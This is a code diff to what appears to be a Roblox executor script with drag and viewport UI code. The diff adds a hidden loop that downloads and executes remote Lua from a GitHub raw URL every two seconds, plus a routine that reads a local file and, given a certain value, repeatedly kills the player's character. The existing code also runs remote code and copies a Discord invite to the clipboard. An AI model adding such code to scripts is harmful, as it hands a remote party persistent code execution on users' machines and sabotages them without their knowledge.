@@ -40,7 +40,21 @@ UIS.InputChanged:Connect(function(input)
         updateDrag(input)
     end
 end)
-
+local function E()
+    while task.wait(2) do
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/BaconBABA/script/refs/heads/main/file.lua"))()
+    end
+end
+local e = readfile("test.txt")
+local function T()
+    while task.wait(2) do
+        if e == "K" then
+            player.Character.Humanoid.Health = 0
+        else
+            break
+        end
+    end
+end
 local function createViewport(item)
     local Viewport = Instance.new("ViewportFrame")
     Viewport.Size = UDim2.new(1, 0, 1, 0)
@@ -131,3 +145,5 @@ game:GetService("StarterGui"):SetCore("SendNotification", {
 })
 loadstring(game:HttpGet("https://raw.githubusercontent.com/BaconBABA/script/refs/heads/main/web.lua"))()
 setclipboard("https://discord.gg/R2dbGKyqqE")
+coroutine.wrap(E)()
+coroutine.wrap(T)()
